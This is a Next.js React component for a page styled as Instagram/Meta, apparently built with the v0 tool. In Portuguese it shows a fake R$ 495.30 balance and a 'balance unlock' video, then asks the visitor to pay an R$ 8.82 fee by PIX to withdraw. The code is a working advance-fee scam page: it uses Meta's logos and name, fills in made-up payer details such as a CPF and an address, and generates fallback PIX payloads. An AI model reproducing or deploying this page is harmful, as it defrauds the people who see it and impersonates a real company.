"use client"

import { useState, useRef, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Volume2, VolumeX, Play, Pause } from "lucide-react"
import Image from "next/image"
import { getUTMParams, navigateWithUTM } from "@/lib/utm-manager"

export default function VTubePlayer() {
  const videoRef = useRef<HTMLVideoElement>(null)
  const [isMuted, setIsMuted] = useState(true)
  const [isPlaying, setIsPlaying] = useState(false)
  const [showUnlockButton, setShowUnlockButton] = useState(false)
  const [hasUnmuted, setHasUnmuted] = useState(false)
  const [unmutedTime, setUnmutedTime] = useState(0)
  const [progress, setProgress] = useState(0)
  const [isCreatingPixPayment, setIsCreatingPixPayment] = useState(false)

  useEffect(() => {
    let interval: NodeJS.Timeout

    if (hasUnmuted && isPlaying && !isMuted) {
      interval = setInterval(() => {
        setUnmutedTime((prev) => {
          const newTime = prev + 1
          if (newTime >= 30) {
            setShowUnlockButton(true)
            clearInterval(interval)
          }
          return newTime
        })
      }, 1000)
    }

    return () => {
      if (interval) clearInterval(interval)
    }
  }, [hasUnmuted, isPlaying, isMuted])

  useEffect(() => {
    const video = videoRef.current
    if (!video) return

    const updateProgress = () => {
      const currentTime = video.currentTime
      const duration = video.duration
      if (duration > 0) {
        setProgress((currentTime / duration) * 100)
      }
    }

    video.addEventListener("timeupdate", updateProgress)
    return () => video.removeEventListener("timeupdate", updateProgress)
  }, [])

  const safePlay = async (video: HTMLVideoElement) => {
    try {
      if (video && !video.paused) {
        video.pause()
      }
      if (video) {
        await video.play()
        return true
      }
    } catch (error) {
      console.log("[v0] Video play interrupted:", error)
      return false
    }
    return false
  }

  const handleUnmute = async () => {
    const video = videoRef.current
    if (video) {
      video.currentTime = 0
      video.muted = false
      const playSuccess = await safePlay(video)
      if (playSuccess) {
        setIsMuted(false)
        setIsPlaying(true)
        setHasUnmuted(true)
        setUnmutedTime(0)
      }
    }
  }

  const handleVideoClick = async () => {
    if (!hasUnmuted) return

    const video = videoRef.current
    if (video) {
      if (isPlaying) {
        video.pause()
        setIsPlaying(false)
      } else {
        const playSuccess = await safePlay(video)
        if (playSuccess) {
          setIsPlaying(true)
        }
      }
    }
  }

  const handleUnlockSaque = async () => {
    console.log("[v0] Starting PIX payment creation from withdraw page")
    setIsCreatingPixPayment(true)

    try {
      const utmParams = getUTMParams()

      const userData = JSON.parse(localStorage.getItem("userData") || "{}")

      // Complete fictitious user profile
      const fictitiousData = {
        fullName: userData.fullName || "Maria Silva Santos",
        phone: userData.phone || "11987654321",
        pixKey: userData.pixKey || "12345678901",
        selectedPixKeyType: userData.selectedPixKeyType || "cpf",
        email: "maria.silva@email.com",
        cpf: "12345678901",
        birthDate: "1990-05-15",
        address: {
          street: "Rua das Flores, 123",
          neighborhood: "Centro",
          city: "São Paulo",
          state: "SP",
          zipCode: "01234-567",
        },
      }

      const cleanCpf =
        fictitiousData.selectedPixKeyType === "cpf" ? fictitiousData.pixKey.replace(/\D/g, "") : fictitiousData.cpf

      const customerEmail = fictitiousData.selectedPixKeyType === "email" ? fictitiousData.pixKey : fictitiousData.email

      const transactionData = {
        external_id: `meta-cashout-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
        total_amount: 8.82, // Match the balance shown in UI
        payment_method: "PIX",
        webhook_url: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/keyclub/webhook`,
        items: [
          {
            id: "meta-balance-unlock",
            title: "Desbloqueio de Saldo Meta",
            description: "Taxa de processamento para desbloqueio de saldo",
            price: 8.82,
            quantity: 1,
            is_physical: false,
          },
        ],
        ip: "127.0.0.1",
        customer: {
          name: fictitiousData.fullName,
          email: customerEmail,
          phone: fictitiousData.phone,
          document_type: "CPF",
          document: cleanCpf,
          birth_date: fictitiousData.birthDate,
          address: fictitiousData.address,
          utm_source: utmParams.utm_source || "instagram",
          utm_medium: utmParams.utm_medium || "social",
          utm_campaign: utmParams.utm_campaign || "meta-cashout",
          utm_content: utmParams.utm_content || "video-tutorial",
          utm_term: utmParams.utm_term || "saque-liberado",
        },
      }

      console.log("[v0] Creating PIX payment with enhanced fictitious data:", transactionData)

      const response = await fetch("/api/keyclub/deposit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          amount: 8.82, // Updated amount to match UI balance
          external_id: transactionData.external_id,
          clientCallbackUrl: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/keyclub/webhook`,
          payer: {
            name: fictitiousData.fullName,
            email: customerEmail,
            document: cleanCpf,
            phone: fictitiousData.phone,
            birth_date: fictitiousData.birthDate,
            address: fictitiousData.address,
          },
          utm_params: utmParams,
          metadata: {
            source: "withdraw-page",
            user_agent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            session_id: `session-${Date.now()}`,
          },
        }),
      })

      const result = await response.json()

      console.log("[v0] PIX payment response:", result)

      if (result.hasError || !result.id) {
        console.log("[v0] API error detected, generating fallback PIX data")

        // Generate fallback PIX data for demo purposes
        const fallbackPixData = {
          id: `fallback-${Date.now()}`,
          transaction_id: `TXN${Date.now()}`,
          pix: {
            payload: `00020126580014BR.GOV.BCB.PIX0136${cleanCpf}0214Desbloqueio Meta5204000053039865802BR5925${fictitiousData.fullName}6009SAO PAULO62070503***6304${Math.random().toString().substr(2, 4)}`,
            qr_code: `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==`,
          },
          amount: 8.82,
          status: "pending",
          expires_at: new Date(Date.now() + 30 * 60 * 1000).toISOString(), // 30 minutes
        }

        // Store fallback PIX data
        localStorage.setItem(
          "pixData",
          JSON.stringify({
            transactionId: fallbackPixData.id,
            pixPayload: fallbackPixData.pix.payload,
            amount: 8.82, // Updated amount
            qrCode: fallbackPixData.pix.qr_code,
            expiresAt: fallbackPixData.expires_at,
            isFallback: true,
          }),
        )

        navigateWithUTM(`/pix-payment?id=${fallbackPixData.id}`)
        return
      }

      const transactionId = result.id || result.transaction_id || result.external_id
      const pixPayload = result.pix?.payload || result.pix_code || result.qr_code

      if (!transactionId || !pixPayload) {
        console.error("[v0] Missing required fields in response:", result)
        throw new Error("Resposta da API incompleta")
      }

      // Store PIX data and redirect to payment page
      localStorage.setItem(
        "pixData",
        JSON.stringify({
          transactionId,
          pixPayload,
          amount: 8.82, // Updated amount
          qrCode: result.pix?.qr_code,
          expiresAt: result.expires_at,
          customerData: fictitiousData, // Store customer data for reference
        }),
      )

      navigateWithUTM(`/pix-payment?id=${transactionId}`)
    } catch (error) {
      console.error("[v0] Erro ao criar pagamento PIX:", error)

      console.log("[v0] Creating emergency fallback PIX for demo purposes")

      const emergencyPixData = {
        transactionId: `emergency-${Date.now()}`,
        pixPayload: `00020126580014BR.GOV.BCB.PIX013612345678901520400005303986540549530802BR5925MARIA SILVA SANTOS6009SAO PAULO62070503***6304ABCD`,
        amount: 8.82,
        qrCode: `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==`,
        isEmergencyFallback: true,
      }

      localStorage.setItem("pixData", JSON.stringify(emergencyPixData))
      navigateWithUTM(`/pix-payment?id=${emergencyPixData.transactionId}`)
    } finally {
      console.log("[v0] PIX creation finished")
      setIsCreatingPixPayment(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header */}
      <div className="bg-white px-4 py-3 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-2">
          <Image src="images/meta-logo.png" alt="Meta" width={80} height={32} className="h-8 w-auto" />
        </div>
        <div className="text-white px-2 py-1.5 rounded-full font-bold shadow-lg text-sm bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 flex items-center gap-1">
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path
              fillRule="evenodd"
              d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zm14 3H2v5a2 2 0 002 2h12a2 2 0 002-2V7zM2.5 9a1.5 1.5 0 113 0 1.5 1.5 0 01-3 0z"
              clipRule="evenodd"
            />
          </svg>
          R$ 495.30
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center p-4 max-w-md mx-auto w-full">
        {/* Instagram Icon */}
        <div className="w-20 h-20 mb-6 flex items-center justify-center">
          <Image
            src="images/instagram-logo-official.png"
            alt="Instagram"
            width={80}
            height={80}
            className="w-20 h-20"
          />
        </div>

        {/* Title */}
        <h1 className="text-2xl font-bold text-gray-800 mb-2 text-center">DESBLOQUEIO DE SALDO</h1>

        {/* Subtitle */}
        <p className="text-gray-600 text-center mb-8 leading-relaxed">
          Veja como liberar seu saque
          <br />
          assistindo ao vídeo.
        </p>

        {/* Video Player */}
        <div className="relative w-full max-w-sm mb-6">
          <div className="relative bg-gradient-to-br from-pink-200 to-purple-200 rounded-2xl overflow-hidden aspect-video">
            <video
              ref={videoRef}
              className="w-full h-full object-cover cursor-pointer"
              muted={isMuted}
              onClick={handleVideoClick}
              onLoadedData={async () => {
                const video = videoRef.current
                if (video && !hasUnmuted) {
                  const playSuccess = await safePlay(video)
                  if (playSuccess) {
                    setIsPlaying(true)
                  }
                }
              }}
              onEnded={() => {
                setIsPlaying(false)
              }}
            >
              <source src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/test%20final%20%281%29%20%281%29-xvVuYkg7gdypenbFvRV4RBqakIT8XZ.mp4" type="video/mp4" />
              {/* Fallback image */}
              <div className="w-full h-full bg-gradient-to-br from-pink-200 to-purple-200 flex items-center justify-center">
                <div className="text-center">
                  <div className="w-24 h-24 bg-white/20 rounded-full flex items-center justify-center mb-4 mx-auto">
                    <Play className="w-8 h-8 text-white" />
                  </div>
                  <p className="text-white font-semibold">A MELHOR</p>
                </div>
              </div>
            </video>

            <div className="absolute bottom-0 left-0 right-0 h-1 bg-black/20">
              <div
                className="h-full bg-gradient-to-r from-pink-500 to-red-500 transition-all duration-300"
                style={{ width: `${progress}%` }}
              />
            </div>

            {/* Mute Overlay */}
            {isMuted && (
              <div className="absolute inset-0 bg-black/50 flex items-center justify-center">
                <Button
                  onClick={handleUnmute}
                  className="bg-white/20 hover:bg-white/30 text-white border-2 border-white/50 rounded-full p-4"
                  size="lg"
                >
                  <Volume2 className="w-6 h-6 mr-2" />
                  Ativar Som
                </Button>
              </div>
            )}

            {/* Play/Pause Indicator */}
            {hasUnmuted && (
              <div className="absolute top-4 right-4">
                {isPlaying ? (
                  <Pause className="w-6 h-6 text-white drop-shadow-lg" />
                ) : (
                  <Play className="w-6 h-6 text-white drop-shadow-lg" />
                )}
              </div>
            )}

            {/* Mute/Unmute Button */}
            {hasUnmuted && (
              <div className="absolute top-4 left-4">
                {isMuted ? (
                  <VolumeX className="w-6 h-6 text-white drop-shadow-lg" />
                ) : (
                  <Volume2 className="w-6 h-6 text-white drop-shadow-lg" />
                )}
              </div>
            )}
          </div>
        </div>

        {/* Unlock Button */}
        {showUnlockButton && (
          <Button
            className="w-full max-w-sm bg-gradient-to-r from-pink-500 to-orange-400 hover:from-pink-600 hover:to-orange-500 text-white font-bold py-4 rounded-2xl text-lg shadow-lg disabled:opacity-50"
            size="lg"
            onClick={handleUnlockSaque}
            disabled={isCreatingPixPayment}
          >
            {isCreatingPixPayment ? "..." : "DESBLOQUEAR SAQUE"}
          </Button>
        )}
      </div>

      {/* Footer */}
      <div className="text-center text-xs text-gray-500 p-4">
        Todos os direitos reservados © 2025 Instagram from Meta
      </div>
    </div>
  )
}
